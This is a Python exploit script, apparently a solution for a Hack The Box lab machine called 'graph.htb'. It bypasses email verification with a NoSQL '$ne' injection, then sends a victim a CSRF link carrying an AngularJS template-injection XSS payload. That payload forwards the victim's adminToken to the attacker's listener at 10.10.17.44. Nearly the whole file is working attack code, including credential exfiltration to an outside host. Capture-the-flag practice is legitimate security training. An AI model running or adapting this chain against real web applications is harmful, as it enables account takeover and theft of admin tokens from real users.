#!/usr/bin/env python3

import json
import requests

from pwn import b64d, b64e, listen, log

URL = 'http://10.10.11.157'
HOST = {'Host': 'internal-api.graph.htb'}

USER = f'rocky'
PASSWORD = 'asdffdsa'
EMAIL = f'{USER}@graph.htb'

s = requests.session()


def register_user():
    s.post(f'{URL}/api/code', headers=HOST, json={
        'email': EMAIL
    })

    s.post(f'{URL}/api/verify', headers=HOST, json={
        'email': EMAIL,
        'code': {
            '$ne': 'foo'
        }
    })

    s.post(f'{URL}/api/register', headers=HOST, json={
        'email': EMAIL,
        'username': USER,
        'password': PASSWORD,
        'confirmPassword': PASSWORD
    })


def login():
    s.post(f'{URL}/graphql', headers=HOST, json={
        'variables': {
            'email': EMAIL,
            'password': PASSWORD
        },
        'query': '''
            mutation login($email: String!, $password: String!) {
                login(email: $email, password: $password) {
                    email
                    username
                    adminToken
                    id
                    admin
                    firstname
                    lastname
                    __typename
                }
            }
        '''
    })


def pad(s: str) -> str:
    return s + '=' * (-len(s) % 4)


def main():
    register_user()
    login()

    jwt_token = s.cookies.get('auth')
    own_id = json.loads(b64d(pad(jwt_token.split('.')[1]).encode())).get('id')

    log.success(f'Logged in as {USER} (password: {PASSWORD})')
    log.info(f'JWT token: {jwt_token}')
    log.info(f'Own user ID: {own_id}')

    victim_user = 'Mark'

    r = s.post(f'{URL}/graphql', headers=HOST, json={
        'variables': {
            'username': victim_user
        },
        'query': '''
            query tasks($username: String!) {
                tasks(username: $username) {
                    Assignedto
                    __typename
                }
            }
        '''
    })

    victim_id = r.json()['data']['tasks'][0]['Assignedto']
    log.success(f"Victim's ID: {victim_id}")

    angularjs_xss_payload = '''{{constructor.constructor('fetch("http://10.10.17.44/" + localStorage.getItem("adminToken"))')()}}'''

    js_payload = '''
        fetch('http://internal-api.graph.htb/graphql', {
          method: 'POST',
          credentials: 'include',
          mode: 'no-cors',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            variables: {
              newusername: '%s',
              id: '%s',
              firstname: `%s`,
              lastname: 'asdf'
            },
            query: `
              mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) {
                  update(newusername: $newusername, id: $id, firstname: $firstname, lastname: $lastname) {
                      __typename
                  }
              }
            `
          })
        })
    ''' % (victim_user, victim_id, angularjs_xss_payload)

    csrf_payload = f'javascript:eval(atob`{b64e(js_payload.encode()).strip("=")}`)'

    s.post(f'{URL}/graphql', headers=HOST, json={
        'variables': {
            'to': f'{victim_user.lower()}@graph.htb',
            'text': f'http://graph.htb/?redirect={csrf_payload}'
        },
        'query': '''
            mutation sendMessage($to: String!, $text: String!) {
                sendMessage(to: $to, text: $text) {
                    __typename
                }
            }
        '''
    })

    http = listen(80)
    http.wait_for_connection()
    admin_token = http.recvuntil(b'HTTP').split()[1][1:].decode()
    http.close()

    log.success(f'adminToken: {admin_token}')


if __name__ == '__main__':
    main()
